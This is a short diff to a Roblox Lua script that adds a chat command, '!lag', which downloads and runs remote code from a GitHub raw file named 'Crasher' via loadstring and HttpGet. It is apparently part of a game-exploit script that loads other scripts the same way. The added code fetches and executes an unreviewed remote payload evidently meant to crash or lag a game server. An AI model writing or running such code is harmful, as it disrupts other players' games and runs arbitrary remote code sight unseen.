@@ -34,6 +34,16 @@ lp.Chatted:Connect(function(msg)
             warn("스크립트 실행 실패: " .. tostring(err))
         end
     end
+
+    if msg == "!lag" then
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/Crasher"))()
+        end)
+        
+        if not success then
+            warn("스크립트 실행 실패: " .. tostring(err))
+        end
+    end
 end)
 
 print("모든 스크립트 로드 완료")
